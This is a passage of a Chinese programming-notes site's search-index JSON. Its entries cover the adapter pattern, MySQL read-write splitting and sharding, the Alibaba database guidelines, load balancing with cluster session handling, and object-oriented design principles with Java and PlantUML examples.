TurkeyAdapter(Turkey turkey) { this.turkey = turkey; } @Override public void quack() { turkey.gobble(); } } public class Client { public static void main(String[] args) { Turkey turkey = new WildTurkey(); Duck duck = new TurkeyAdapter(turkey); duck.quack(); } } JDK     java.util.Arrays#asList() java.util.Collections#list() java.util.Collections#enumeration() javax.xml.bind.annotation.adapters.XMLAdapter  "},{"id":403,"href":"/system-design/%E8%AF%BB%E5%86%99%E5%88%86%E7%A6%BB%E5%88%86%E5%BA%93%E5%88%86%E8%A1%A8/","title":"读写分离分库分表","parent":"system-design","content":"大家好呀！今天和小伙伴们聊聊读写分离以及分库分表。\n相信很多小伙伴们对于这两个概念已经比较熟悉了，这篇文章全程都是大白话的形式，希望能够给你带来不一样的感受。\n如果你之前不太了解这两个概念，那我建议你搞懂之后，可以把自己对于读写分离以及分库分表的理解讲给你的同事/朋友听听。\n原创不易，若有帮助，点赞/分享就是对我最大的鼓励！\n个人能力有限。如果文章有任何需要补充/完善/修改的地方，欢迎在评论区指出，共同进步！\n读写分离\u0026amp;分库分表    读写分离    何为读写分离？    见名思意，根据读写分离的名字，我们就可以知道：读写分离主要是为了将对数据库的读写操作分散到不同的数据库节点上。 这样的话，就能够小幅提升写性能，大幅提升读性能。\n我简单画了一张图来帮助不太清楚读写分离的小伙伴理解。\n一般情况下，我们都会选择一主多从，也就是一台主数据库负责写，其他的从数据库负责读。主库和从库之间会进行数据同步，以保证从库中数据的准确性。这样的架构实现起来比较简单，并且也符合系统的写少读多的特点。\n读写分离会带来什么问题？如何解决？    读写分离对于提升数据库的并发非常有效，但是，同时也会引来一个问题：主库和从库的数据存在延迟，比如你写完主库之后，主库的数据同步到从库是需要时间的，这个时间差就导致了主库和从库的数据不一致性问题。这也就是我们经常说的 主从同步延迟 。\n主从同步延迟问题的解决，没有特别好的一种方案（可能是我太菜了，欢迎评论区补充）。你可以根据自己的业务场景，参考一下下面几种解决办法。\n1.强制将读请求路由到主库处理。\n既然你从库的数据过期了，那我就直接从主库读取嘛！这种方案虽然会增加主库的压力，但是，实现起来比较简单，也是我了解到的使用最多的一种方式。\n比如 Sharding-JDBC 就是采用的这种方案。通过使用 Sharding-JDBC 的 HintManager 分片键值管理器，我们可以强制使用主库。\nHintManager hintManager = HintManager.getInstance(); hintManager.setMasterRouteOnly(); // 继续JDBC操作 对于这种方案，你可以将那些必须获取最新数据的读请求都交给主库处理。\n2.延迟读取。\n还有一些朋友肯定会想既然主从同步存在延迟，那我就在延迟之后读取啊，比如主从同步延迟 0.5s,那我就 1s 之后再读取数据。这样多方便啊！方便是方便，但是也很扯淡。\n不过，如果你是这样设计业务流程就会好很多：对于一些对数据比较敏感的场景，你可以在完成写请求之后，避免立即进行请求操作。比如你支付成功之后，跳转到一个支付成功的页面，当你点击返回之后才返回自己的账户。\n另外，《MySQL 实战 45 讲》这个专栏中的《读写分离有哪些坑？》这篇文章还介绍了很多其他比较实际的解决办法，感兴趣的小伙伴可以自行研究一下。\n如何实现读写分离？    不论是使用哪一种读写分离具体的实现方案，想要实现读写分离一般包含如下几步：\n 部署多台数据库，选择其中的一台作为主数据库，其他的一台或者多台作为从数据库。 保证主数据库和从数据库之间的数据是实时同步的，这个过程也就是我们常说的主从复制。 系统将写请求交给主数据库处理，读请求交给从数据库处理。  落实到项目本身的话，常用的方式有两种：\n1.代理方式\n我们可以在应用和数据中间加了一个代理层。应用程序所有的数据请求都交给代理层处理，代理层负责分离读写请求，将它们路由到对应的数据库中。\n提供类似功能的中间件有 MySQL Router（官方）、Atlas（基于 MySQL Proxy）、Maxscale、MyCat。\n2.组件方式\n在这种方式中，我们可以通过引入第三方组件来帮助我们读写请求。\n这也是我比较推荐的一种方式。这种方式目前在各种互联网公司中用的最多的，相关的实际的案例也非常多。如果你要采用这种方式的话，推荐使用 sharding-jdbc ，直接引入 jar 包即可使用，非常方便。同时，也节省了很多运维的成本。\n你可以在 shardingsphere 官方找到sharding-jdbc 关于读写分离的操作。\n主从复制原理了解么？    MySQL binlog(binary log 即二进制日志文件) 主要记录了 MySQL 数据库中数据的所有变化(数据库执行的所有 DDL 和 DML 语句)。因此，我们根据主库的 MySQL binlog 日志就能够将主库的数据同步到从库中。\n更具体和详细的过程是这个样子的（图片来自于：《MySQL Master-Slave Replication on the Same Machine》）：\n 主库将数据库中数据的变化写入到 binlog 从库连接主库 从库会创建一个 I/O 线程向主库请求更新的 binlog 主库会创建一个 binlog dump 线程来发送 binlog ，从库中的 I/O 线程负责接收 从库的 I/O 线程将接收的 binlog 写入到 relay log 中。 从库的 SQL 线程读取 relay log 同步数据本地（也就是再执行一遍 SQL ）。  怎么样？看了我对主从复制这个过程的讲解，你应该搞明白了吧!\n你一般看到 binlog 就要想到主从复制。当然，除了主从复制之外，binlog 还能帮助我们实现数据恢复。\n🌈 拓展一下：\n不知道大家有没有使用过阿里开源的一个叫做 canal 的工具。这个工具可以帮助我们实现 MySQL 和其他数据源比如 Elasticsearch 或者另外一台 MySQL 数据库之间的数据同步。很显然，这个工具的底层原理肯定也是依赖 binlog。canal 的原理就是模拟 MySQL 主从复制的过程，解析 binlog 将数据同步到其他的数据源。\n另外，像咱们常用的分布式缓存组件 Redis 也是通过主从复制实现的读写分离。\n🌕 简单总结一下：\nMySQL 主从复制是依赖于 binlog 。另外，常见的一些同步 MySQL 数据到其他数据源的工具（比如 canal）的底层一般也是依赖 binlog 。\n分库分表    读写分离主要应对的是数据库读并发，没有解决数据库存储问题。试想一下：如果 MySQL 一张表的数据量过大怎么办?\n换言之，我们该如何解决 MySQL 的存储压力呢？\n答案之一就是 分库分表。\n何为分库？    分库 就是将数据库中的数据分散到不同的数据库上。\n下面这些操作都涉及到了分库：\n 你将数据库中的用户表和用户订单表分别放在两个不同的数据库。 由于用户表数据量太大，你对用户表进行了水平切分，然后将切分后的 2 张用户表分别放在两个不同的数据库。  何为分表？    分表 就是对单表的数据进行拆分，可以是垂直拆分，也可以是水平拆分。\n何为垂直拆分？\n简单来说，垂直拆分是对数据表列的拆分，把一张列比较多的表拆分为多张表。\n举个例子：我们可以将用户信息表中的一些列单独抽出来作为一个表。\n何为水平拆分？\n简单来说，水平拆分是对数据表行的拆分，把一张行比较多的表拆分为多张表。\n举个例子：我们可以将用户信息表拆分成多个用户信息表，这样就可以避免单一表数据量过大对性能造成影响。\n《从零开始学架构》 中的有一张图片对于垂直拆分和水平拆分的描述还挺直观的。\n什么情况下需要分库分表？    遇到下面几种场景可以考虑分库分表：\n 单表的数据达到千万级别以上，数据库读写速度比较缓慢（分表）。 数据库中的数据占用的空间越来越大，备份时间越来越长（分库）。 应用的并发量太大（分库）。  分库分表会带来什么问题呢？    记住，你在公司做的任何技术决策，不光是要考虑这个技术能不能满足我们的要求，是否适合当前业务场景，还要重点考虑其带来的成本。\n引入分库分表之后，会给系统带来什么挑战呢？\n join 操作 ： 同一个数据库中的表分布在了不同的数据库中，导致无法使用 join 操作。这样就导致我们需要手动进行数据的封装，比如你在一个数据库中查询到一个数据之后，再根据这个数据去另外一个数据库中找对应的数据。 事务问题 ：同一个数据库中的表分布在了不同的数据库中，如果单个操作涉及到多个数据库，那么数据库自带的事务就无法满足我们的要求了。 分布式 id ：分库之后， 数据遍布在不同服务器上的数据库，数据库的自增主键已经没办法满足生成的主键唯一了。我们如何为不同的数据节点生成全局唯一主键呢？这个时候，我们就需要为我们的系统引入分布式 id 了。 \u0026hellip;\u0026hellip;  另外，引入分库分表之后，一般需要 DBA 的参与，同时还需要更多的数据库服务器，这些都属于成本。\n分库分表有没有什么比较推荐的方案？    ShardingSphere 项目（包括 Sharding-JDBC、Sharding-Proxy 和 Sharding-Sidecar）是当当捐入 Apache 的，目前主要由京东数科的一些巨佬维护。\nShardingSphere 绝对可以说是当前分库分表的首选！ShardingSphere 的功能完善，除了支持读写分离和分库分表，还提供分布式事务、数据库治理等功能。\n另外，ShardingSphere 的生态体系完善，社区活跃，文档完善，更新和发布比较频繁。\n艿艿之前写了一篇分库分表的实战文章，各位朋友可以看看：《芋道 Spring Boot 分库分表入门》 。\n分库分表后，数据怎么迁移呢？    分库分表之后，我们如何将老库（单库单表）的数据迁移到新库（分库分表后的数据库系统）呢？\n比较简单同时也是非常常用的方案就是停机迁移，写个脚本老库的数据写到新库中。比如你在凌晨 2 点，系统使用的人数非常少的时候，挂一个公告说系统要维护升级预计 1 小时。然后，你写一个脚本将老库的数据都同步到新库中。\n如果你不想停机迁移数据的话，也可以考虑双写方案。双写方案是针对那种不能停机迁移的场景，实现起来要稍微麻烦一些。具体原理是这样的：\n 我们对老库的更新操作（增删改），同时也要写入新库（双写）。如果操作的数据不存在于新库的话，需要插入到新库中。 这样就能保证，咱们新库里的数据是最新的。 在迁移过程，双写只会让被更新操作过的老库中的数据同步到新库，我们还需要自己写脚本将老库中的数据和新库的数据做比对。如果新库中没有，那咱们就把数据插入到新库。如果新库有，旧库没有，就把新库对应的数据删除（冗余数据清理）。 重复上一步的操作，直到老库和新库的数据一致为止。  想要在项目中实施双写还是比较麻烦的，很容易会出现问题。我们可以借助上面提到的数据库同步工具 Canal 做增量数据迁移（还是依赖 binlog，开发和维护成本较低）。\n"},{"id":404,"href":"/database/mysql/%E9%98%BF%E9%87%8C%E5%B7%B4%E5%B7%B4%E5%BC%80%E5%8F%91%E6%89%8B%E5%86%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E9%83%A8%E5%88%86%E7%9A%84%E4%B8%80%E4%BA%9B%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/","title":"阿里巴巴开发手册数据库部分的一些最佳实践","parent":"mysql","content":"阿里巴巴Java开发手册数据库部分的一些最佳实践总结    模糊查询    对于模糊查询阿里巴巴开发手册这样说到：\n 【强制】页面搜索严禁左模糊或者全模糊，如果需要请走搜索引擎来解决。\n说明:索引文件具有 B-Tree 的最左前缀匹配特性，如果左边的值未确定，那么无法使用此索引。\n 外键和级联    对于外键和级联，阿里巴巴开发手册这样说到：\n 【强制】不得使用外键与级联，一切外键概念必须在应用层解决。\n说明:以学生和成绩的关系为例，学生表中的 student_id 是主键，那么成绩表中的 student_id 则为外键。如果更新学生表中的 student_id，同时触发成绩表中的 student_id 更新，即为级联更新。外键与级联更新适用于单机低并发，不适合分布式、高并发集群;级联更新是强阻塞，存在数据库更新风暴的风 险;外键影响数据库的插入速度\n 为什么不要用外键呢？大部分人可能会这样回答：\n  增加了复杂性： a.每次做DELETE 或者UPDATE都必须考虑外键约束，会导致开发的时候很痛苦,测试数据极为不方便;b.外键的主从关系是定的，假如那天需求有变化，数据库中的这个字段根本不需要和其他表有关联的话就会增加很多麻烦。 增加了额外工作： 数据库需要增加维护外键的工作，比如当我们做一些涉及外键字段的增，删，更新操作之后，需要触发相关操作去检查，保证数据的的一致性和正确性，这样会不得不消耗资源；（个人觉得这个不是不用外键的原因，因为即使你不使用外键，你在应用层面也还是要保证的。所以，我觉得这个影响可以忽略不计。） 外键还会因为需要请求对其他表内部加锁而容易出现死锁情况； 对分库分表不友好 ：因为分库分表下外键是无法生效的。 \u0026hellip;\u0026hellip;   我个人觉得上面这种回答不是特别的全面，只是说了外键存在的一个常见的问题。实际上，我们知道外键也是有很多好处的，比如：\n 保证了数据库数据的一致性和完整性； 级联操作方便，减轻了程序代码量； \u0026hellip;\u0026hellip;  所以说，不要一股脑的就抛弃了外键这个概念，既然它存在就有它存在的道理，如果系统不涉及分库分表，并发量不是很高的情况还是可以考虑使用外键的。\n我个人是不太喜欢外键约束，比较喜欢在应用层去进行相关操作。\n关于@Transactional注解    对于@Transactional事务注解，阿里巴巴开发手册这样说到：\n 【参考】@Transactional事务不要滥用。事务会影响数据库的QPS，另外使用事务的地方需要考虑各方面的回滚方案，包括缓存回滚、搜索引擎回滚、消息补偿、统计修正等。\n "},{"id":405,"href":"/%E7%AC%94%E8%AE%B0/%E9%9B%86%E7%BE%A4/","title":"集群","parent":"笔记","content":"集群     集群  一、负载均衡  负载均衡算法  1. 轮询（Round Robin） 2. 加权轮询（Weighted Round Robbin） 3. 最少连接（least Connections） 4. 加权最少连接（Weighted Least Connection） 5. 随机算法（Random） 6. 源地址哈希法 (IP Hash)   转发实现  1. HTTP 重定向 2. DNS 域名解析 3. 反向代理服务器 4. 网络层 5. 链路层     二、集群下的 Session 管理  Sticky Session Session Replication Session Server      一、负载均衡    集群中的应用服务器（节点）通常被设计成无状态，用户可以请求任何一个节点。\n负载均衡器会根据集群中每个节点的负载情况，将用户请求转发到合适的节点上。\n负载均衡器可以用来实现高可用以及伸缩性：\n 高可用：当某个节点故障时，负载均衡器会将用户请求转发到另外的节点上，从而保证所有服务持续可用； 伸缩性：根据系统整体负载情况，可以很容易地添加或移除节点。  负载均衡器运行过程包含两个部分：\n 根据负载均衡算法得到转发的节点； 进行转发。  负载均衡算法    1. 轮询（Round Robin）    轮询算法把每个请求轮流发送到每个服务器上。\n下图中，一共有 6 个客户端产生了 6 个请求，这 6 个请求按 (1, 2, 3, 4, 5, 6) 的顺序发送。(1, 3, 5) 的请求会被发送到服务器 1，(2, 4, 6) 的请求会被发送到服务器 2。\n\n该算法比较适合每个服务器的性能差不多的场景，如果有性能存在差异的情况下，那么性能较差的服务器可能无法承担过大的负载（下图的 Server 2）。\n\n2. 加权轮询（Weighted Round Robbin）    加权轮询是在轮询的基础上，根据服务器的性能差异，为服务器赋予一定的权值，性能高的服务器分配更高的权值。\n例如下图中，服务器 1 被赋予的权值为 5，服务器 2 被赋予的权值为 1，那么 (1, 2, 3, 4, 5) 请求会被发送到服务器 1，(6) 请求会被发送到服务器 2。\n\n3. 最少连接（least Connections）    由于每个请求的连接时间不一样，使用轮询或者加权轮询算法的话，可能会让一台服务器当前连接数过大，而另一台服务器的连接过小，造成负载不均衡。\n例如下图中，(1, 3, 5) 请求会被发送到服务器 1，但是 (1, 3) 很快就断开连接，此时只有 (5) 请求连接服务器 1；(2, 4, 6) 请求被发送到服务器 2，只有 (2) 的连接断开，此时 (6, 4) 请求连接服务器 2。该系统继续运行时，服务器 2 会承担过大的负载。\n\n最少连接算法就是将请求发送给当前最少连接数的服务器上。\n例如下图中，服务器 1 当前连接数最小，那么新到来的请求 6 就会被发送到服务器 1 上。\n\n4. 加权最少连接（Weighted Least Connection）    在最少连接的基础上，根据服务器的性能为每台服务器分配权重，再根据权重计算出每台服务器能处理的连接数。\n5. 随机算法（Random）    把请求随机发送到服务器上。\n和轮询算法类似，该算法比较适合服务器性能差不多的场景。\n\n6. 源地址哈希法 (IP Hash)    源地址哈希通过对客户端 IP 计算哈希值之后，再对服务器数量取模得到目标服务器的序号。\n可以保证同一 IP 的客户端的请求会转发到同一台服务器上，用来实现会话粘滞（Sticky Session）\n\n转发实现    1. HTTP 重定向    HTTP 重定向负载均衡服务器使用某种负载均衡算法计算得到服务器的 IP 地址之后，将该地址写入 HTTP 重定向报文中，状态码为 302。客户端收到重定向报文之后，需要重新向服务器发起请求。\n缺点：\n 需要两次请求，因此访问延迟比较高； HTTP 负载均衡器处理能力有限，会限制集群的规模。  该负载均衡转发的缺点比较明显，实际场景中很少使用它。\n\n2. DNS 域名解析    在 DNS 解析域名的同时使用负载均衡算法计算服务器 IP 地址。\n优点：\n DNS 能够根据地理位置进行域名解析，返回离用户最近的服务器 IP 地址。  缺点：\n 由于 DNS 具有多级结构，每一级的域名记录都可能被缓存，当下线一台服务器需要修改 DNS 记录时，需要过很长一段时间才能生效。  大型网站基本使用了 DNS 做为第一级负载均衡手段，然后在内部使用其它方式做第二级负载均衡。也就是说，域名解析的结果为内部的负载均衡服务器 IP 地址。\n\n3. 反向代理服务器    反向代理服务器位于源服务器前面，用户的请求需要先经过反向代理服务器才能到达源服务器。反向代理可以用来进行缓存、日志记录等，同时也可以用来做为负载均衡服务器。\n在这种负载均衡转发方式下，客户端不直接请求源服务器，因此源服务器不需要外部 IP 地址，而反向代理需要配置内部和外部两套 IP 地址。\n优点：\n 与其它功能集成在一起，部署简单。  缺点：\n 所有请求和响应都需要经过反向代理服务器，它可能会成为性能瓶颈。  4. 网络层    在操作系统内核进程获取网络数据包，根据负载均衡算法计算源服务器的 IP 地址，并修改请求数据包的目的 IP 地址，最后进行转发。\n源服务器返回的响应也需要经过负载均衡服务器，通常是让负载均衡服务器同时作为集群的网关服务器来实现。\n优点：\n 在内核进程中进行处理，性能比较高。  缺点：\n 和反向代理一样，所有的请求和响应都经过负载均衡服务器，会成为性能瓶颈。  5. 链路层    在链路层根据负载均衡算法计算源服务器的 MAC 地址，并修改请求数据包的目的 MAC 地址，并进行转发。\n通过配置源服务器的虚拟 IP 地址和负载均衡服务器的 IP 地址一致，从而不需要修改 IP 地址就可以进行转发。也正因为 IP 地址一样，所以源服务器的响应不需要转发回负载均衡服务器，可以直接转发给客户端，避免了负载均衡服务器的成为瓶颈。\n这是一种三角传输模式，被称为直接路由。对于提供下载和视频服务的网站来说，直接路由避免了大量的网络传输数据经过负载均衡服务器。\n这是目前大型网站使用最广负载均衡转发方式，在 Linux 平台可以使用的负载均衡服务器为 LVS（Linux Virtual Server）。\n参考：\n Comparing Load Balancing Algorithms Redirection and Load Balancing  二、集群下的 Session 管理    一个用户的 Session 信息如果存储在一个服务器上，那么当负载均衡器把用户的下一个请求转发到另一个服务器，由于服务器没有用户的 Session 信息，那么该用户就需要重新进行登录等操作。\nSticky Session    需要配置负载均衡器，使得一个用户的所有请求都路由到同一个服务器，这样就可以把用户的 Session 存放在该服务器中。\n缺点：\n 当服务器宕机时，将丢失该服务器上的所有 Session。  \nSession Replication    在服务器之间进行 Session 同步操作，每个服务器都有所有用户的 Session 信息，因此用户可以向任何一个服务器进行请求。\n缺点：\n 占用过多内存； 同步过程占用网络带宽以及服务器处理器时间。  \nSession Server    使用一个单独的服务器存储 Session 数据，可以使用传统的 MySQL，也使用 Redis 或者 Memcached 这种内存型数据库。\n优点：\n 为了使得大型网站具有伸缩性，集群中的应用服务器通常需要保持无状态，那么应用服务器不能存储用户的会话信息。Session Server 将用户的会话信息单独进行存储，从而保证了应用服务器的无状态。  缺点：\n 需要去实现存取 Session 的代码。  \n参考：\n Session Management using Spring Session with JDBC DataStore  "},{"id":406,"href":"/%E7%AC%94%E8%AE%B0/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3/","title":"面向对象思想","parent":"笔记","content":"面向对象思想     面向对象思想  一、三大特性  封装 继承 多态   二、类图  泛化关系 (Generalization) 实现关系 (Realization) 聚合关系 (Aggregation) 组合关系 (Composition) 关联关系 (Association) 依赖关系 (Dependency)   三、设计原则  S.O.L.I.D 其他常见原则   参考资料    一、三大特性    封装    利用抽象数据类型将数据和基于数据的操作封装在一起，使其构成一个不可分割的独立实体。数据被保护在抽象数据类型的内部，尽可能地隐藏内部的细节，只保留一些对外的接口使其与外部发生联系。用户无需关心对象内部的细节，但可以通过对象对外提供的接口来访问该对象。\n优点：\n 减少耦合：可以独立地开发、测试、优化、使用、理解和修改 减轻维护的负担：可以更容易被理解，并且在调试的时候可以不影响其他模块 有效地调节性能：可以通过剖析来确定哪些模块影响了系统的性能 提高软件的可重用性 降低了构建大型系统的风险：即使整个系统不可用，但是这些独立的模块却有可能是可用的  以下 Person 类封装 name、gender、age 等属性，外界只能通过 get() 方法获取一个 Person 对象的 name 属性和 gender 属性，而无法获取 age 属性，但是 age 属性可以供 work() 方法使用。\n注意到 gender 属性使用 int 数据类型进行存储，封装使得用户注意不到这种实现细节。并且在需要修改 gender 属性使用的数据类型时，也可以在不影响客户端代码的情况下进行。\npublic class Person { private String name; private int gender; private int age; public String getName() { return name; } public String getGender() { return gender == 0 ? \u0026#34;man\u0026#34; : \u0026#34;woman\u0026#34;; } public void work() { if (18 \u0026lt;= age \u0026amp;\u0026amp; age \u0026lt;= 50) { System.out.println(name + \u0026#34; is working very hard!\u0026#34;); } else { System.out.println(name + \u0026#34; can\u0026#39;t work any more!\u0026#34;); } } } 继承    继承实现了 IS-A 关系，例如 Cat 和 Animal 就是一种 IS-A 关系，因此 Cat 可以继承自 Animal，从而获得 Animal 非 private 的属性和方法。\n继承应该遵循里氏替换原则，子类对象必须能够替换掉所有父类对象。\nCat 可以当做 Animal 来使用，也就是说可以使用 Animal 引用 Cat 对象。父类引用指向子类对象称为 向上转型 。\nAnimal animal = new Cat(); 多态    多态分为编译时多态和运行时多态：\n 编译时多态主要指方法的重载 运行时多态指程序中定义的对象引用所指向的具体类型在运行期间才确定  运行时多态有三个条件：\n 继承 覆盖（重写） 向上转型  下面的代码中，乐器类（Instrument）有两个子类：Wind 和 Percussion，它们都覆盖了父类的 play() 方法，并且在 main() 方法中使用父类 Instrument 来引用 Wind 和 Percussion 对象。在 Instrument 引用调用 play() 方法时，会执行实际引用对象所在类的 play() 方法，而不是 Instrument 类的方法。\npublic class Instrument { public void play() { System.out.println(\u0026#34;Instument is playing...\u0026#34;); } } public class Wind extends Instrument { public void play() { System.out.println(\u0026#34;Wind is playing...\u0026#34;); } } public class Percussion extends Instrument { public void play() { System.out.println(\u0026#34;Percussion is playing...\u0026#34;); } } public class Music { public static void main(String[] args) { List\u0026lt;Instrument\u0026gt; instruments = new ArrayList\u0026lt;\u0026gt;(); instruments.add(new Wind()); instruments.add(new Percussion()); for(Instrument instrument : instruments) { instrument.play(); } } } Wind is playing... Percussion is playing... 二、类图    以下类图使用 PlantUML 绘制，更多语法及使用请参考：http://plantuml.com/ 。\n泛化关系 (Generalization)    用来描述继承关系，在 Java 中使用 extends 关键字。\n\n@startuml title Generalization class Vihical class Car class Trunck Vihical \u0026lt;|-- Car Vihical \u0026lt;|-- Trunck @enduml 实现关系 (Realization)    用来实现一个接口，在 Java 中使用 implements 关键字。\n\n@startuml title Realization interface MoveBehavior class Fly class Run MoveBehavior \u0026lt;|.. Fly MoveBehavior \u0026lt;|.. Run @enduml 聚合关系 (Aggregation)    表示整体由部分组成，但是整体和部分不是强依赖的，整体不存在了部分还是会存在。\n\n@startuml title Aggregation class Computer class Keyboard class Mouse class Screen Computer o-- Keyboard Computer o-- Mouse Computer o-- Screen @enduml 组合关系 (Composition)    和聚合不同，组合中整体和部分是强依赖的，整体不存在了部分也不存在了。比如公司和部门，公司没了部门就不存在了。但是公司和员工就属于聚合关系了，因为公司没了员工还在。\n\n@startuml title Composition class Company class DepartmentA class DepartmentB Company *-- DepartmentA Company *-- DepartmentB @enduml 关联关系 (Association)    表示不同类对象之间有关联，这是一种静态关系，与运行过程的状态无关，在最开始就可以确定。因此也可以用 1 对 1、多对 1、多对多这种关联关系来表示。比如学生和学校就是一种关联关系，一个学校可以有很多学生，但是一个学生只属于一个学校，因此这是一种多对一的关系，在运行开始之前就可以确定。\n\n@startuml title Association class School class Student School \u0026#34;1\u0026#34; - \u0026#34;n\u0026#34; Student @enduml 依赖关系 (Dependency)    和关联关系不同的是，依赖关系是在运行过程中起作用的。A 类和 B 类是依赖关系主要有三种形式：\n A 类是 B 类方法的局部变量； A 类是 B 类方法的参数； A 类向 B 类发送消息，从而影响 B 类发生变化。  \n@startuml title Dependency class Vihicle { move(MoveBehavior) } interface MoveBehavior { move() } note \u0026#34;MoveBehavior.move()\u0026#34; as N Vihicle ..\u0026gt; MoveBehavior Vihicle .. N @enduml 三、设计原则    S.O.L.I.D       简写 全拼 中文翻译     SRP The Single Responsibility Principle 单一责任原则   OCP The Open Closed Principle 开放封闭原则   LSP The Liskov Substitution Principle 里氏替换原则   ISP The Interface Segregation Principle 接口分离原则   DIP The Dependency Inversion Principle 依赖倒置原则    1. 单一责任原则     修改一个类的原因应该只有一个。\n 换句话说就是让一个类只负责一件事，当这个类需要做过多事情的时候，就需要分解这个类。\n如果一个类承担的职责过多，就等于把这些职责耦合在了一起，一个职责的变化可能会削弱这个类完成其它职责的能力。\n2. 开放封闭原则     类应该对扩展开放，对修改关闭。\n 扩展就是添加新功能的意思，因此该原则要求在添加新功能时不需要修改代码。\n符合开闭原则最典型的设计模式是装饰者模式，它可以动态地将责任附加到对象上，而不用去修改类的代码。\n3. 里氏替换原则     子类对象必须能够替换掉所有父类对象。\n 继承是一种 IS-A 关系，子类需要能够当成父类来使用，并且需要比父类更特殊。\n如果不满足这个原则，那么各个子类的行为上就会有很大差异，增加继承体系的复杂度。\n4. 接口分离原则     不应该强迫客户依赖于它们不用的方法。\n 因此使用多个专门的接口比使用单一的总接口要好。\n5. 依赖倒置原则     高层模块不应该依赖于低层模块，二者都应该依赖于抽象；抽象不应该依赖于细节，细节应该依赖于抽象。\n 高层模块包含一个应用程序中重要的策略选择和业务模块，如果高层模块依赖于低层模块，那么低层模块的改动就会直接影响到高层模块，从而迫使高层模块也需要改动。\n依赖于抽象意味着：\n 任何变量都不应该持有一个指向具体类的指针或者引用； 任何类都不应该从具体类派生； 任何方法都不应该覆写它的任何基类中的已经实现的方法。  其他常见原则    除了上述的经典原则，在实际开发中还有下面这些常见的设计原则。\n   简写 全拼 中文翻译     LOD The Law of Demeter 迪米特法则   CRP The Composite Reuse Principle 合成复用原则   CCP The Common Closure Principle 共同封闭原则   SAP The Stable Abstractions Principle 稳定抽象原则   SDP The Stable Dependencies Principle 稳定依赖原则    1. 迪米特法则    迪米特法则又叫作最少知识原则（Least Knowledge Principle，简写 LKP），就是说一个对象应当对其他对象有尽可能少的了解，不和陌生人说话。\n2. 合成复用原则    尽量使用对象组合，而不是通过继承来达到复用的目的。\n3. 共同封闭原则    一起修改的类，应该组合在一起（同一个包里）。如果必须修改应用程序里的代码，我们希望所有的修改都发生在一个包里（修改关闭），而不是遍布在很多包里。\n4. 稳定抽象原则    最稳定的包应该是最抽象的包，不稳定的包应该是具体的包，即包的抽象程度跟它的稳定性成正比。\n5. 稳定依赖原则    包之间的依赖关系都应该是稳定方向依赖的，包要依赖的包要比自己更具有稳定性。\n参考资料     Java 编程思想 敏捷软件开发：原则、模式与实践 面向对象设计的 SOLID 原则 看懂 UML 类图和时序图 UML 系列——时序图（顺序图）sequence diagram 面向对象编程三大特性 \u0026mdash;\u0026mdash; 封装、继承、多态  "}]